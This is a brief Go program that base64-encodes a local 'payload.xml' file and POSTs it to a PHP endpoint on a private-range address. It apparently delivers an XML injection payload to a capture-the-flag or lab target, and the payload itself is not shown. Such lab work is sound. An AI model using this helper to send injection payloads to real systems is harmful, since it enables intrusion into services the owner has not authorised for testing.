package main

import (
	"bufio"
	"encoding/base64"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
)

func main() {
	f, _ := os.Open("payload.xml")

	// read file into byte slice
	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)

	// encode as base64
	b64_encoded := base64.StdEncoding.EncodeToString(content)

	resp, err := http.PostForm("http://10.10.11.100/tracker_diRbPr00f314.php",
		url.Values{"data": {b64_encoded}})

	if err != nil {
		panic(err)
	}

	body, _ := ioutil.ReadAll(resp.Body)
	log.Printf("body: %v", string(body))
}
